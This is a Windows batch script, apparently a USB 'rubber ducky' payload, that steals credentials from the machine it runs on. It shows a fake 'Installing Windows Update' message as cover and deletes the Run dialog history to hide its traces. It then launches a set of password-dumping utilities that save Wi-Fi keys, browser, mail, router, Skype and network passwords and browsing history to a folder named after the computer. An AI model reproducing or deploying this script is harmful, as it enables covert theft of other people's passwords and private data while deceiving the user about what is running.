@echo off
REM will just look like and update is being done.
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM make a folder for where passwords will be stored. 
set "$time=%time: =0%"
set dst=%~dp0\grabbedPasswords\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%$time:~-11,2%%$time:~-8,2%%$time:~-5,2%
mkdir %dst% >>nul

REM runs all programs and grabs everything it can for password on the workstation.
start %~dp0MrGraysRubberHack\WirelessKeyView.exe /stext %dst%\WirelessKeyView.txt
start %~dp0MrGraysRubberHack\WebBrowserPassView.exe /stext %dst%\WebBrowserPassView.txt
start %~dp0MrGraysRubberHack\SkypeLogView.exe /stext %dst%\SkypeLogView.txt
start %~dp0MrGraysRubberHack\RouterPassView.exe /stext %dst%\RouterPassView.txt
start %~dp0MrGraysRubberHack\pspv.exe /stext %dst%\pspv.txt
start %~dp0MrGraysRubberHack\PasswordFox.exe /stext %dst%\PasswordFox.txt
start %~dp0MrGraysRubberHack\OperaPassView.exe /stext %dst%\OperaPassView.txt
start %~dp0MrGraysRubberHack\mspass.exe /stext %dst%\mspass.txt
start %~dp0MrGraysRubberHack\mailpv.exe /stext %dst%\mailpv.txt
start %~dp0MrGraysRubberHack\iepv.exe /stext %dst%\iepv.txt
start %~dp0MrGraysRubberHack\ChromePass.exe /stext %dst%\ChromePass.txt
start %~dp0MrGraysRubberHack\ChromeHistoryView.exe /stext %dst%\ChromeHistoryView.txt
start %~dp0MrGraysRubberHack\BulletsPassView.exe /stext %dst%\BulletsPassView.txt
start %~dp0MrGraysRubberHack\BrowsingHistoryView.exe /stext %dst%\BrowsingHistoryView.txt
start %~dp0MrGraysRubberHack\netpass.exe /stext %dst%\netpass.txt
